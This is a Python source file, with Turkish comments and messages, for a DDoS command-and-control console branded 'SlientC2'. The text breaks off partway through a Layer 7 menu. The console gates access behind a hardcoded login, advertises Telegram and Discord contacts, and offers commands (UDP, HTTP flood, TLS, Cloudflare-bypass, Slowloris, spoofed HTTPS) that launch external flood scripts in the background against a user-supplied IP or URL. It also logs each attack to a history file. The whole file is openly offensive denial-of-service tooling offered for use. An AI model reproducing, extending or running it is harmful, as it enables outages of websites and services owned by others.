#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# SlientC2 – Saldırı banner ayrı ekranda, prompt açık, stop komutu ile durdurma

import os
import sys
import time
import subprocess
import getpass
import random
import datetime
import json
import threading
import signal
from colorama import Fore, init, Style

init(autoreset=True)

if os.name == 'nt':
    os.system("chcp 65001 > nul")
try:
    sys.stdout.reconfigure(encoding='utf-8')
except AttributeError:
    pass

# ========== RENK TEMALARI ==========
TEMA_VARSAYILAN = 1
TEMALAR = {
    1: {
        "isim": "Varsayılan (Mavi-Mor)",
        "palet": [255, 254, 253, 117, 81, 45, 39, 45, 81, 117, 153, 189, 255]
    },
    2: {
        "isim": "Kırmızı-Turuncu",
        "palet": [196, 202, 208, 214, 220, 226, 220, 214, 208, 202, 196]
    },
    3: {
        "isim": "Yeşil-Açık Yeşil",
        "palet": [46, 82, 118, 154, 190, 226, 190, 154, 118, 82, 46]
    },
    4: {
        "isim": "Sarı-Beyaz",
        "palet": [226, 229, 231, 255, 231, 229, 226]
    },
    5: {
        "isim": "Pembe-Mor",
        "palet": [206, 212, 218, 224, 230, 236, 230, 224, 218, 212, 206]
    },
    6: {
        "isim": "Mavi-Gökyüzü",
        "palet": [33, 69, 105, 141, 177, 213, 177, 141, 105, 69, 33]
    },
    7: {
        "isim": "Gri-Beyaz (Sade)",
        "palet": [244, 246, 248, 250, 252, 254, 252, 250, 248, 246, 244]
    }
}

mevcut_tema = TEMA_VARSAYILAN
line_palette = TEMALAR[mevcut_tema]["palet"].copy()

def tema_degistir(tema_no):
    global mevcut_tema, line_palette
    if tema_no in TEMALAR:
        mevcut_tema = tema_no
        line_palette = TEMALAR[tema_no]["palet"].copy()
        return True
    return False

def tema_listele():
    print("\nMevcut Renk Temaları:")
    for no, t in TEMALAR.items():
        aktif = " (Aktif)" if no == mevcut_tema else ""
        print(f"  {no}: {t['isim']}{aktif}")
    print("Kullanım: theme <numara>  (örnek: theme 2)")

# ========== SALDIRI GEÇMİŞİ ==========
HISTORY_FILE = "attack_history.json"

def history_ekle(target, port, duration, method, threads):
    try:
        with open(HISTORY_FILE, 'r') as f:
            history = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        history = []

    entry = {
        "tarih": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "hedef": target,
        "port": port,
        "sure": duration,
        "metod": method,
        "thread": threads
    }
    history.append(entry)

    with open(HISTORY_FILE, 'w') as f:
        json.dump(history, f, indent=2)

def history_listele():
    try:
        with open(HISTORY_FILE, 'r') as f:
            history = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        print("\n[!] Henüz hiç saldırı kaydı yok.\n")
        return

    if not history:
        print("\n[!] Henüz hiç saldırı kaydı yok.\n")
        return

    print("\n" + gradient_text("╔══════════════════════════════════════════════════════════════════════╗"))
    print(gradient_text("║                           SALDIRI GEÇMİŞİ                                     ║"))
    print(gradient_text("╠══════════════════════════════════════════════════════════════════════╣"))
    for i, entry in enumerate(history[-20:], 1):
        line = f"  {i}. [{entry['tarih']}] {entry['metod']} -> {entry['hedef']}:{entry['port']} ({entry['sure']}s) Threads:{entry['thread']}"
        print(gradient_text("║ " + line.ljust(70) + "║"))
    print(gradient_text("╚══════════════════════════════════════════════════════════════════════╝\n"))

# ========== GRADIENT ==========
def gradient_text(text):
    result = ""
    for i, char in enumerate(text):
        color = line_palette[i % len(line_palette)]
        result += f"\033[38;5;{color}m{char}"
    return result + "\033[0m"

pad = " " * 4
small_pad = " " * 7

ascii_art = [
"         ╔═╗ ╦   ╦ ╔═╗ ╔╗╔ ╔╦╗",
"         ╚═╗ ║   ║ ║╣  ║║║  ║ ",
"         ╚═╝ ╚═╝ ╩ ╚═╝ ╝╚╝  ╩ "
]

def show_logo_and_boxes():
    os.system('clear')
    for line in ascii_art:
        print(gradient_text(pad + line))
    print(gradient_text(pad + "╔════════════════════════════════════╗"))
    print(gradient_text(pad + "║        DdoS Attack Tool            ║"))
    print(gradient_text(pad + "║      Telegram: @SlientBotnet       ║"))
    print(gradient_text(pad + "╚════════════════════════════════════╝"))
    print(gradient_text(small_pad + "╔══════════════════════════════╗"))
    print(gradient_text(small_pad + "║    write 'help' for usage    ║"))
    print(gradient_text(small_pad + "╚══════════════════════════════╝"))
    print("\n")
    print("[!] Kullanım için 'help' yazın. Metod adını tek başına yazarsanız kullanım bilgisi alırsınız.")
    print("[!] 'theme' ile renk teması değiştirebilir, 'clear' ile ekranı temizleyebilirsiniz.")
    print("[!] 'history' ile saldırı geçmişini görebilirsiniz.")
    print("[!] 'stop' ile tüm çalışan saldırıları durdurabilirsiniz.\n")

# ========== LOGIN ==========
KULLANICI_ADI = "Zeldy"
SIFRE = " "

def login():
    os.system('clear')
    print(gradient_text(pad + "╔═════════════════════════════════════╗"))
    print(gradient_text(pad + "║      Slient DdoS Login              ║"))
    print(gradient_text(pad + "║   For the password: t.me/Zeldy_here ║"))
    print(gradient_text(pad + "╚═════════════════════════════════════╝"))
    
    username = input("Username:  ")
    password = getpass.getpass("password: ")
    
    if username != KULLANICI_ADI or password != SIFRE:
        print("\nHatalı kullanıcı adı veya şifre!")
        time.sleep(2)
        return False
    
    os.system('clear')
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mSlient \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Zeldy ! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: Zeldy \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v4.0')
    time.sleep(0.5)
    return True

# ========== PROMPT ==========
def prompt():
    print(Fore.WHITE + "┌──[SlientC2] - [SlientC2/root]")
    print(Fore.WHITE + "└─➤  ", end="")
    sys.stdout.write("\033[0m")
    sys.stdout.flush()
    return input()

# ========== SALDIRI BANNER (AYRI EKRAN) ==========
def show_attack_banner(target, port, duration, method, threads=None, vip=True, expiry=864.70, cooldown=0.00):
    os.system('clear')  # Banner için ayrı ekran
    now = datetime.datetime.now().strftime("%b %d %Y %H:%M:%S")
    sent_by = "root"
    vip_str = "true" if vip else "false"
    method_upper = method.upper()

    attacksent_art = [
        "╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═   ╔═╗╔═╗╔╗╔╔╦╗",
        "╠═╣ ║  ║ ╠═╣║  ╠╩╗   ╚═╗║╣ ║║║ ║ ",
        "╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩   ╚═╝╚═╝╝╚╝ ╩ "
    ]
    for line in attacksent_art:
        print(gradient_text(pad + line.center(60)))

    width = 60
    border = "═" * (width - 2)
    empty = " " * (width - 2)

    def center(text):
        return text.center(width - 2)

    def left(text):
        return text.ljust(width - 2)

    print(gradient_text(pad + "╔" + border + "╗"))
    print(gradient_text(pad + "║" + left(f"  Target: [{target}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  Time: [{duration}]s") + "║"))
    print(gradient_text(pad + "║" + left(f"  Port: [{port}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  Method: [{method_upper}]") + "║"))
    print(gradient_text(pad + "╠" + "═" * (width - 2) + "╣"))
    if threads is not None:
        print(gradient_text(pad + "║" + left(f"  Threads: [{threads}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  VIP: {vip_str}") + "║"))
    print(gradient_text(pad + "║" + left(f"  Expiry: [{expiry:.2f}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  Cooldown: [{cooldown:.2f}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  Timestamp: [{now}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  Sent by: [{sent_by}]") + "║"))
    print(gradient_text(pad + "║" + empty + "║"))
    print(gradient_text(pad + "║" + left("  Join: t.me/artichetm2") + "║"))
    print(gradient_text(pad + "║" + left("  Discord: @articnetxv") + "║"))
    print(gradient_text(pad + "╚" + border + "╝"))
    print("\n" + Fore.CYAN + "[*] Saldırı başlatılıyor... (stop ile durdurabilirsiniz)" + Fore.WHITE + "\n")

# ========== STOP KOMUTU ==========
def cmd_stop():
    """Tüm çalışan saldırı proseslerini sonlandırır."""
    killed = 0
    try:
        # Node.js proseslerini öldür
        result = subprocess.run(["pgrep", "-f", "node"], capture_output=True, text=True)
        if result.stdout:
            pids = result.stdout.strip().split('\n')
            for pid in pids:
                try:
                    os.kill(int(pid), signal.SIGTERM)
                    killed += 1
                except:
                    pass
        
        # Python proseslerini öldür (saldırı scriptleri)
        result = subprocess.run(["pgrep", "-f", "udp.py|cf-pro.py|goldeneye.py|https-spoof.py"], capture_output=True, text=True)
        if result.stdout:
            pids = result.stdout.strip().split('\n')
            for pid in pids:
                try:
                    os.kill(int(pid), signal.SIGTERM)
                    killed += 1
                except:
                    pass
        
        # Go proseslerini öldür
        result = subprocess.run(["pgrep", "-f", "httpflood.go|raw.http.go"], capture_output=True, text=True)
        if result.stdout:
            pids = result.stdout.strip().split('\n')
            for pid in pids:
                try:
                    os.kill(int(pid), signal.SIGTERM)
                    killed += 1
                except:
                    pass
        
        if killed > 0:
            print(f"[+] {killed} saldırı prosesi sonlandırıldı.")
        else:
            print("[!] Çalışan saldırı prosesi bulunamadı.")
    except Exception as e:
        print(f"[!] Hata: {e}")

# ========== KOMUT İŞLEYİCİLER ==========
def run_script(script_name, args):
    if not os.path.exists(script_name):
        possible = [f for f in os.listdir('.') if f.lower() == script_name.lower()]
        if possible:
            script_name = possible[0]
        else:
            print(f"[!] {script_name} dosyası bulunamadı!")
            print(f"[!] Mevcut .py dosyaları: {', '.join([f for f in os.listdir('.') if f.endswith('.py')])}")
            return
    cmd = ["python3", script_name] + args
    try:
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # Popen ile arka planda çalıştır
    except Exception as e:
        print(f"[!] Beklenmeyen hata: {e}")

def run_go_script(script_name, args):
    if not os.path.exists(script_name):
        print(f"[!] {script_name} dosyası bulunamadı!")
        return
    cmd = ["go", "run", script_name] + args
    try:
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        print("[!] 'go' komutu bulunamadı. 'pkg install golang' ile kurun.")
    except Exception as e:
        print(f"[!] Beklenmeyen hata: {e}")

def run_cfpro_script(url, threads, seconds):
    if not os.path.exists("cf-pro.py"):
        print("[!] cf-pro.py dosyası bulunamadı!")
        return
    try:
        subprocess.Popen(["python3", "cf-pro.py", url, threads, seconds], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"[!] Beklenmeyen hata: {e}")

def run_node_script(script_name, args):
    if not os.path.exists(script_name):
        print(f"[!] {script_name} dosyası bulunamadı!")
        return
    cmd = ["node", script_name] + args
    try:
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        print("[!] 'node' komutu bulunamadı. 'pkg install nodejs' ile kurun.")
    except Exception as e:
        print(f"[!] Beklenmeyen hata: {e}")

def cmd_udp(args):
    if len(args) < 3:
        print("[!] Eksik argüman. Kullanım: udp <ip> <port> <süre>")
        print("Örnek: udp 1.1.1.1 80 60")
        return
    ip, port, duration = args[0], args[1], args[2]
    show_attack_banner(ip, port, duration, "UDP", threads="2048/16384", vip=True)
    history_ekle(ip, port, duration, "UDP", "2048/16384")
    run_script("udp.py", [ip, port, duration])

def cmd_httpflood(args):
    if len(args) < 4:
        print("[!] Eksik argüman. Kullanım: httpflood <url> <threads> <get/post> <seconds> [header]")
        print("Örnek: httpflood https://example.com 500 get 60 nil")
        return
    url = args[0]
    threads = args[1]
    method = args[2].lower()
    seconds = args[3]
    header = args[4] if len(args) > 4 else "nil"
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, seconds, "HTTP-FLOOD", threads=threads, vip=True)
    history_ekle(url, port, seconds, "HTTP-FLOOD", threads)
    run_go_script("httpflood.go", [url, threads, method, seconds, header])

def cmd_cfpro(args):
    if len(args) < 3:
        print("[!] Eksik argüman. Kullanım: cfpro <url> <threads> <seconds>")
        print("Örnek: cfpro https://example.com 500 60")
        return
    url = args[0]
    threads = args[1]
    seconds = args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, seconds, "CF-PRO", threads=threads, vip=True)
    history_ekle(url, port, seconds, "CF-PRO", threads)
    run_cfpro_script(url, threads, seconds)

def cmd_flood(args):
    if len(args) < 3:
        print("[!] Eksik argüman. Kullanım: flood <url> <süre> <thread>")
        print("Örnek: flood https://example.com 60 15000")
        return
    url = args[0]
    duration = args[1]
    threads = args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "FLOOD", threads=threads, vip=True)
    history_ekle(url, port, duration, "FLOOD", threads)
    if not os.path.exists("proxy.txt"):
        print("[!] proxy.txt dosyası bulunamadı, boş oluşturuluyor...")
        with open("proxy.txt", "w") as f:
            f.write("")
    run_node_script("flood.js", [url, duration, threads, threads, "proxy.txt"])

def cmd_httpraw(args):
    if len(args) < 2:
        print("[!] Eksik argüman. Kullanım: http-raw <url> <süre>")
        print("Örnek: http-raw http://example.com 60")
        return
    url = args[0]
    duration = args[1]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "HTTP-RAW", threads=None, vip=True)
    history_ekle(url, port, duration, "HTTP-RAW", "1")
    run_node_script("HTTP-RAW.js", [url, duration])

def cmd_httpsocket(args):
    if len(args) < 3:
        print("[!] Eksik argüman. Kullanım: http-socket <url> <thread> <süre>")
        print("Örnek: http-socket http://example.com 5000 60")
        return
    url = args[0]
    threads = args[1]
    duration = args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "HTTP-SOCKET", threads=threads, vip=True)
    history_ekle(url, port, duration, "HTTP-SOCKET", threads)
    run_node_script("HTTP-SOCKET.js", [url, threads, duration])

def cmd_httprand(args):
    if len(args) < 2:
        print("[!] Eksik argüman. Kullanım: http-rand <url> <süre>")
        print("Örnek: http-rand http://vailon.com/ 60")
        return
    url = args[0]
    duration = args[1]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "HTTP-RAND", threads=None, vip=True)
    history_ekle(url, port, duration, "HTTP-RAND", "1")
    run_node_script("HTTP-RAND.js", [url, duration])

def cmd_httpspoof(args):
    if len(args) < 3:
        print("[!] Eksik argüman. Kullanım: https-spoof <url> <süre> <thread>")
        print("Örnek: https-spoof http://vailon.com 60 500")
        return
    url = args[0]
    duration = args[1]
    threads = args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "HTTPS-SPOOF", threads=threads, vip=True)
    history_ekle(url, port, duration, "HTTPS-SPOOF", threads)
    run_script("https-spoof.py", [url, duration, threads])

def cmd_tls(args):
    if len(args) < 3:
        print("[!] Eksik argüman. Kullanım: tls <url> <süre> <thread>")
        print("Örnek: tls https://example.com 60 1250")
        return
    url = args[0]
    duration = args[1]
    threads = args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "TLS", threads=threads, vip=True)
    history_ekle(url, port, duration, "TLS", threads)
    if not os.path.exists("proxy.txt"):
        print("[!] proxy.txt dosyası bulunamadı, boş oluşturuluyor...")
        with open("proxy.txt", "w") as f:
            f.write("")
    run_node_script("tls.js", [url, duration, threads, "GET", "proxy.txt", threads])

def cmd_tls2(args):
    if len(args) < 3:
        print("[!] Eksik argüman. Kullanım: tls2 <url> <süre> <thread>")
        print("Örnek: tls2 https://example.com 60 1250")
        return
    url = args[0]
    duration = args[1]
    threads = args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "TLS-PROXY", threads=threads, vip=True)
    history_ekle(url, port, duration, "TLS-PROXY", threads)
    run_node_script("tls-proxy.js", [url, duration, threads])

def cmd_tls3(args):
    if len(args) < 3:
        print("[!] Eksik argüman. Kullanım: tls3 <url> <süre> <thread>")
        print("Örnek: tls3 https://example.com 60 1250")
        return
    url = args[0]
    duration = args[1]
    threads = args[2]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "TLS3", threads=threads, vip=True)
    history_ekle(url, port, duration, "TLS3", threads)
    run_node_script("tls3.js", [url, duration, threads])

def cmd_httpflood2(args):
    if len(args) < 2:
        print("[!] Eksik argüman. Kullanım: httpflood2 <url> <süre>")
        print("Örnek: httpflood2 https://example.com 60")
        return
    url = args[0]
    duration = args[1]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "HTTP-FLOOD2", threads="Proxy", vip=True)
    history_ekle(url, port, duration, "HTTP-FLOOD2", "Proxy")
    if not os.path.exists("proxy.txt"):
        print("[!] proxy.txt dosyası bulunamadı!")
        return
    run_node_script("httpflood2.js", [url, duration])

def cmd_slow(args):
    if len(args) < 2:
        print("[!] Eksik argüman. Kullanım: slow <url> <süre>")
        print("Örnek: slow http://vailon.com 60")
        return
    url = args[0]
    duration = args[1]
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "SLOW", threads="Slowloris", vip=True)
    history_ekle(url, port, duration, "SLOW", "Slowloris")
    run_node_script("slow.js", [url, duration])

# ========== RENK TEMASI VE CLEAR ==========
def cmd_theme(args):
    if len(args) < 1:
        tema_listele()
        return
    try:
        tema_no = int(args[0])
        if tema_degistir(tema_no):
            print(f"[+] Tema '{TEMALAR[tema_no]['isim']}' olarak değiştirildi.")
            show_logo_and_boxes()
        else:
            print("[!] Geçersiz tema numarası. 'theme' yazarak listeyi görebilirsiniz.")
    except ValueError:
        print("[!] Lütfen geçerli bir sayı girin. Örnek: theme 2")

def cmd_clear():
    show_logo_and_boxes()

# ========== MENÜLER ==========
def cmd_l7():
    os.system('clear')
    l7_lines = [
        "╔═══════════════╗",
        "║    Layer 7    ║",
        "╠═══════════════╩═══════════════════════════════════════╗",
        "║  httpflood                                          ║",
        "║  cfpro                                              ║",
        "║  flood                                              ║",
        "║  http-raw                                           ║",
        "║  http-socket                                        ║",
        "║  http-rand                                          ║",
        "║  https-spoof               